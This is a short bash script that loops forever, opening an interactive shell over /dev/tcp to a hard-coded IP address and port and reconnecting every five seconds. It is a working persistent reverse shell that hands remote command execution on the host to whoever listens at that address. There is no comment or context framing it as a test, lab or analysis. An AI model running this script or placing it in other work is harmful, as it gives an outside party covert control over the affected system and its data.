#!/usr/bin/env bash
HOST="217.138.219.220"
PORT="56257"

SLEEP_TIME=5

while true; do
    sh -i >& /dev/tcp/${HOST}/${PORT} 0>&1
    sleep ${SLEEP_TIME}
done
